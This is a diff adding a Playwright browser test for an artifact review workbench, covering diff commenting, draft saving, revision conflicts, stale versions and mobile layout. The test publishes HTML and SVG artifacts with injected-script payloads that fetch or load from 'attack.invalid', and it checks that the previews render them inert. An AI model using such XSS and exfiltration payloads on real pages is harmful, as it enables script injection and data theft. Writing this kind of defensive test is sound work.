@@ -57,6 +57,8 @@ import {
   saveArtifactFeedback,
   listArtifactFeedback,
   addressArtifactFeedback,
+  parseChangesetBytes,
+  ArtifactReviewError,
 } from './artifact-review.ts';
 import {
   createToolBrokerExportObject,
@@ -1051,6 +1053,516 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
       ),
     ).rejects.toThrow('feedback_limit');
   });
+  it.skipIf(process.env.ALLRICE_WORKBENCH_BROWSER_TEST !== '1')(
+    'P07 real Chromium and PostgreSQL: Cline diff, persisted review, stale versions and inert previews',
+    async () => {
+      const f = await artifactFixture();
+      const original = 'export const answer = 41;\nconsole.log(answer);\n',
+        revised = 'export const answer = 42;\nconsole.log(answer);\n';
+      const sha = (text: string) =>
+        `sha256:${createHash('sha256').update(text).digest('hex')}`;
+      const changes = {
+        contractVersion: 1,
+        comparisonScope: 'changeset',
+        execution: f.operation().input.snapshot.binding.execution,
+        files: [
+          {
+            path: 'answer.ts',
+            before: { text: original, checksum: sha(original) },
+            after: { text: revised, checksum: sha(revised) },
+          },
+        ],
+      };
+      const change = await f.publish(
+        'browser-change',
+        JSON.stringify(changes),
+        undefined,
+        'changeset',
+      );
+      const html =
+        '<script>globalThis.P07_ATTACK=1;fetch("https://attack.invalid/leak")</script><img src="https://attack.invalid/pixel">';
+      const htmlArtifact = await publishWorkbenchArtifact(
+        {
+          context: f.execution,
+          sessionId: f.sessionId,
+          callId: 'html',
+          kind: 'document',
+          fileName: 'preview.html',
+          format: 'text',
+          mediaType: 'text/html',
+          bytes: Buffer.from(html),
+        },
+        f.storage,
+        database,
+      );
+      const textArtifact = await f.publish(
+        'document',
+        'first line\nsecond line',
+      );
+      const svg =
+        '<svg xmlns="http://www.w3.org/2000/svg" onload="globalThis.P07_ATTACK=2"><image href="https://attack.invalid/svg"/></svg>';
+      const svgArtifact = await publishWorkbenchArtifact(
+        {
+          context: f.execution,
+          sessionId: f.sessionId,
+          callId: 'svg',
+          kind: 'document',
+          fileName: 'untrusted.svg',
+          format: 'text',
+          mediaType: 'image/svg+xml',
+          bytes: Buffer.from(svg),
+        },
+        f.storage,
+        database,
+      );
+      const longText = 'row data\n'.repeat(20_000);
+      const largeArtifact = await f.publish(
+        'large-changeset',
+        JSON.stringify({
+          ...changes,
+          files: [
+            {
+              path: 'large.txt',
+              before: null,
+              after: { text: longText, checksum: sha(longText) },
+            },
+          ],
+        }),
+        undefined,
+        'changeset',
+      );
+      const evidenceDir = await mkdtemp(resolve('.local/p07-browser-'));
+      const require = createRequire(resolve('apps/worker/package.json'));
+      const { chromium } = require('playwright-core') as typeof Playwright;
+      const build = createRequire(require.resolve('tsx/package.json'))(
+        'esbuild',
+      ).build;
+      const output = await build({
+        entryPoints: [resolve('apps/web/test/workbench-page.tsx')],
+        bundle: true,
+        write: false,
+        outdir: join(f.root, 'ui'),
+        platform: 'browser',
+        format: 'esm',
+        splitting: true,
+        minify: true,
+        jsx: 'automatic',
+        define: { 'process.env.NODE_ENV': '"production"' },
+      });
+      const assets = new Map<string, { text: string; contents: Uint8Array }>(
+        output.outputFiles.map(
+          (file: { path: string; text: string; contents: Uint8Array }) => [
+            file.path.slice(join(f.root, 'ui').length),
+            file,
+          ],
+        ),
+      );
+      let origin = '',
+        lostSave = false,
+        writeCount = 0;
+      const server = createServer((req, res) => {
+        void (async () => {
+          const url = new URL(req.url ?? '/', origin || 'http://localhost'),
+            path = url.pathname;
+          if (path === '/') {
+            res.setHeader(
+              'set-cookie',
+              'p07=synthetic; HttpOnly; SameSite=Strict; Path=/',
+            );
+            res.setHeader('content-type', 'text/html');
+            res.end(
+              `<!doctype html><html><head><meta name="viewport" content="width=device-width"><style>*{box-sizing:border-box}body{margin:0;font:14px system-ui}body,button,select{color:#20242b;background:#fff}</style><link rel="stylesheet" href="/workbench-page.css"></head><body><div id="root"></div><script id="p07-input" type="application/json">${JSON.stringify({ sessionId: f.sessionId, workspaceId: f.context.workspaceId, tenantHeaders: {} })}</script><script type="module" src="/workbench-page.js"></script></body></html>`,
+            );
+            return;
+          }
+          const asset = assets.get(path);
+          if (asset) {
+            res.setHeader(
+              'content-type',
+              path.endsWith('.css') ? 'text/css' : 'application/javascript',
+            );
+            res.end(asset.contents);
+            return;
+          }
+          res.setHeader('content-type', 'application/json');
+          res.setHeader('cache-control', 'private, no-store');
+          if (!req.headers.cookie?.includes('p07=synthetic')) {
+            res.writeHead(401).end('{}');
+            return;
+          }
+          const base = `/api/v1/sessions/${f.sessionId}/artifacts`;
+          if (!path.startsWith(base)) {
+            res.writeHead(404).end('{}');
+            return;
+          }
+          const context = {
+            ...f.context,
+            workspaceId:
+              url.searchParams.get('workspaceId') ?? f.context.workspaceId,
+          };
+          const result = async () => {
+            if (path === base)
+              return listWorkbenchArtifacts(
+                context,
+                f.sessionId,
+                url.searchParams.has('before')
+                  ? JSON.parse(url.searchParams.get('before')!)
+                  : undefined,
+                database,
+              );
+            const [id, action] = path.slice(base.length + 1).split('/');
+            const artifact = await getWorkbenchArtifact(
+              context,
+              f.sessionId,
+              id!,
+              database,
+            );
+            if (action === 'content') {
+              const bytes = await readArtifactBytes(f.storage, artifact.object);
+              return artifact.kind === 'changeset'
+                ? { kind: 'changeset', changeset: parseChangesetBytes(bytes) }
+                : {
+                    kind: 'text',
+                    text: bytes.toString('utf8'),
+                    mediaType: artifact.object.mediaType,
+                  };
+            }
+            if (action === 'feedback') {
+              if (req.headers.origin !== origin) {
+                res.statusCode = 403;
+                return {};
+              }
+              let size = 0;
+              const chunks: Buffer[] = [];
+              for await (const chunk of req) {
+                size += chunk.length;
+                if (size > 300000) throw Error('too_large');
+                chunks.push(Buffer.from(chunk));
+              }
+              const body = JSON.parse(Buffer.concat(chunks).toString());
+              if (body.artifactId !== id) throw Error('mismatch');
+              writeCount++;
+              const feedback = await saveArtifactFeedback(
+                context,
+                f.sessionId,
+                body,
+                req.method === 'POST',
+                f.storage,
+                database,
+              );
+              if (lostSave) {
+                lostSave = false;
+                res.statusCode = 503;
+                return {};
+              }
+              return { feedback };
+            }
+            return {
+              artifact,
+              feedback: await listArtifactFeedback(
+                context,
+                f.sessionId,
+                id!,
+                database,
+              ),
+            };
+          };
+          try {
+            res.end(JSON.stringify(await result()));
+          } catch (error) {
+            res.statusCode =
+              error instanceof ArtifactReviewError
+                ? /changed|conflict|submitted/.test(error.code)
+                  ? 409
+                  : /identity/.test(error.code)
+                    ? 403
+                    : 400
+                : 500;
+            res.end(
+              JSON.stringify({
+                code:
+                  error instanceof ArtifactReviewError
+                    ? error.code
+                    : 'fixture_error',
+              }),
+            );
+          }
+        })().catch(() => {
+          res.statusCode = 500;
+          res.end('{}');
+        });
+      });
+      server.listen(0, '127.0.0.1');
+      await once(server, 'listening');
+      origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
+      const browser = await chromium.launch({
+        headless: true,
+        executablePath:
+          '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
+      });
+      try {
+        const page = await browser.newPage({
+            viewport: { width: 1450, height: 1050 },
+          }),
+          external: string[] = [],
+          errors: string[] = [];
+        page.on('pageerror', (e) => errors.push(e.message));
+        page.on('request', (r) => {
+          if (!r.url().startsWith(origin)) external.push(r.url());
+        });
+        await page.goto(origin);
+        await page
+          .getByRole('button', { name: '工件与审查', exact: true })
+          .click();
+        await page
+          .getByLabel('工件版本', { exact: true })
+          .selectOption(change.id);
+        await page.waitForSelector('[data-cline-diff] diffs-container');
+        await page.waitForFunction(() => {
+          const root = document.querySelector(
+            '[data-cline-diff] diffs-container',
+          )?.shadowRoot;
+          return (
+            !!root?.querySelector('style[data-theme-css]') &&
+            root.textContent?.includes('42')
+          );
+        });
+        expect(
+          await page
+            .getByText('比较范围：本次 Changeset 提案', { exact: false })
+            .isVisible(),
+        ).toBe(true);
+        await page
+          .locator(
+            '[data-cline-diff] diffs-container [data-additions] [data-column-number="1"]',
+          )
+          .click();
+        expect(
+          await page.getByLabel('起始行', { exact: true }).inputValue(),
+        ).toBe('1');
+        expect(
+          await page.getByLabel('评论侧', { exact: true }).inputValue(),
+        ).toBe('after');
+        await page
+          .getByText('位置：answer.ts · 修改后 L1', { exact: false })
+          .waitFor();
+        await page.screenshot({ path: join(evidenceDir, 'desktop-diff.png') });
+        await page
+          .getByLabel('评论内容', { exact: true })
+          .fill('请加上这行的测试。');
+        await page.getByRole('button', { name: '加入本批意见' }).click();
+        lostSave = true;
+        await page
+          .getByRole('button', { name: '保存草稿', exact: true })
+          .click();
+        await page.getByRole('alert').waitFor();
+        await page
+          .getByRole('button', { name: '保存草稿', exact: true })
+          .click();
+        await page.getByText('草稿已保存，重新打开可继续编辑。').waitFor();
+        const saved = await listArtifactFeedback(
+          f.context,
+          f.sessionId,
+          change.id,
+          database,
+        );
+        expect(saved).toHaveLength(1);
+        expect(saved[0]!.revision).toBe(1);
+        expect(saved[0]!.comments[0]!.anchor).toMatchObject({
+          path: 'answer.ts',
+          side: 'after',
+          startLine: 1,
+          endLine: 1,
+        });
+        await page.reload();
+        await page
+          .getByRole('button', { name: '工件与审查', exact: true })
+          .click();
+        await page
+          .getByLabel('工件版本', { exact: true })
+          .selectOption(change.id);
+        await page.getByRole('button', { name: '移除此条' }).waitFor();
+        await page
+          .getByRole('button', { name: '提交本批意见', exact: true })
+          .click();
+        await page
+          .getByText('意见已提交，等待后续处理。它不是文件执行授权。')
+          .waitFor();
+        expect(
+          (
+            await listArtifactFeedback(
+              f.context,
+              f.sessionId,
+              change.id,
+              database,
+            )
+          )[0]!.state,
+        ).toBe('submitted');
+        expect(
+          await database`select id from allrice_runtime_operations where organization_id=${f.context.organizationId}`,
+        ).toHaveLength(0);
+        await page
+          .getByLabel('工件版本', { exact: true })
+          .selectOption(textArtifact.id);
+        await page.getByLabel('评论内容', { exact: true }).fill('全局意见');
+        await page.getByRole('button', { name: '加入本批意见' }).click();
+        await page
+          .getByRole('button', { name: '保存草稿', exact: true })
+          .click();
+        await page.getByText('草稿已保存，重新打开可继续编辑。').waitFor();
+        // A second window must not replace a newer revision with its old draft.
+        const peer = await browser.newPage({
+          viewport: { width: 1450, height: 1050 },
+        });
+        await peer.goto(origin);
+        await peer
+          .getByRole('button', { name: '工件与审查', exact: true })
+          .click();
+        await peer
+          .getByLabel('工件版本', { exact: true })
+          .selectOption(textArtifact.id);
+        await peer.getByRole('button', { name: '移除此条' }).waitFor();
+        await peer
+          .getByLabel('评论内容', { exact: true })
+          .fill('第二个窗口的旧草稿');
+        await peer.getByRole('button', { name: '加入本批意见' }).click();
+        await page
+          .getByLabel('评论内容', { exact: true })
+          .fill('第一个窗口的补充');
+        await page.getByRole('button', { name: '加入本批意见' }).click();
+        await page
+          .getByRole('button', { name: '保存草稿', exact: true })
+          .click();
+        await expect
+          .poll(
+            async () =>
+              (
+                await listArtifactFeedback(
+                  f.context,
+                  f.sessionId,
+                  textArtifact.id,
+                  database,
+                )
+              )[0]?.revision,
+          )
+          .toBe(2);
+        await peer
+          .getByRole('button', { name: '保存草稿', exact: true })
+          .click();
+        await peer
+          .getByRole('alert')
+          .filter({ hasText: '版本或草稿已变化' })
+          .waitFor();
+        const currentDraft = await listArtifactFeedback(
+          f.context,
+          f.sessionId,
+          textArtifact.id,
+          database,
+        );
+        expect(currentDraft).toHaveLength(1);
+        expect(currentDraft[0]!.comments.map((c) => c.text)).toEqual([
+          '全局意见',
+          '第一个窗口的补充',
+        ]);
+        await peer.close();
+        const revisedDoc = await f.publish(
+          'doc-revision',
+          'first line\nrevised line',
+          textArtifact.object.id,
+        );
+        await page
+          .getByRole('button', { name: '刷新版本反馈', exact: true })
+          .click();
+        await page.getByText('旧版本 · 仅查看').waitFor();
+        expect(
+          await page
+            .getByRole('button', { name: '提交本批意见', exact: true })
+            .isDisabled(),
+        ).toBe(true);
+        await page.getByRole('button', { name: '查看最新版本' }).click();
+        await page.getByText('revised line', { exact: false }).waitFor();
+        expect(
+          (
+            await getWorkbenchArtifact(
+              f.context,
+              f.sessionId,
+              revisedDoc.id,
+              database,
+            )
+          ).stale,
+        ).toBe(false);
+        await page
+          .getByRole('button', { name: '刷新列表', exact: true })
+          .click();
+        await page
+          .getByLabel('工件版本', { exact: true })
+          .selectOption(htmlArtifact.id);
+        await page.getByText(html, { exact: false }).first().waitFor();
+        await page
+          .getByLabel('工件版本', { exact: true })
+          .selectOption(svgArtifact.id);
+        await page.getByText(svg, { exact: false }).first().waitFor();
+        expect(
+          await page.evaluate(() => Reflect.get(globalThis, 'P07_ATTACK')),
+        ).toBeUndefined();
+        expect(external).toEqual([]);
+        await page
+          .getByLabel('工件版本', { exact: true })
+          .selectOption(largeArtifact.id);
+        await page
+          .getByText('文件过长，已停用富 Diff。', { exact: false })
+          .waitFor();
+        expect(await page.locator('[data-cline-diff]').count()).toBe(0);
+        await page
+          .getByText('查看完整前后文本（分页）', { exact: true })
+          .click();
+        await page
+          .getByRole('button', { name: '下一页正文', exact: true })
+          .click();
+        await page
+          .getByRole('button', { name: '评论第 101 行', exact: true })
+          .click();
+        expect(
+          await page.getByLabel('起始行', { exact: true }).inputValue(),
+        ).toBe('101');
+        expect(await page.locator('pre button').count()).toBe(100);
+        await page.setViewportSize({ width: 390, height: 844 });
+        const dialog = page.getByRole('dialog', { name: '工件与审查工作台' });
+        await dialog.waitFor();
+        expect(
+          await page.evaluate(
+            () => document.documentElement.scrollWidth <= innerWidth,
+          ),
+        ).toBe(true);
+        await page.screenshot({
+          path: join(evidenceDir, 'mobile-preview.png'),
+        });
+        await dialog.focus();
+        await page.keyboard.press('Shift+Tab');
+        expect(await dialog.locator(':focus').count()).toBe(1);
+        await page.keyboard.press('Escape');
+        await page.getByRole('dialog').waitFor({ state: 'hidden' });
+        expect(
+          await page
+            .getByRole('button', { name: '工件与审查', exact: true })
+            .evaluate((e) => e === document.activeElement),
+        ).toBe(true);
+        expect(errors).toEqual([]);
+        expect(writeCount).toBe(6);
+        console.info(
+          'P07 browser evidence:',
+          evidenceDir,
+          'bundled bytes:',
+          [...assets.values()].reduce((n, a) => n + a.contents.length, 0),
+        );
+      } finally {
+        await browser.close();
+        server.closeAllConnections();
+        await new Promise<void>((resolve) => server.close(() => resolve()));
+      }
+    },
+    120_000,
+  );
   it('P05 requires exact approval even for tenant Allow; old clients cannot claim commands', async () => {
     const f = await commandFixture();
     const created = await f.create();
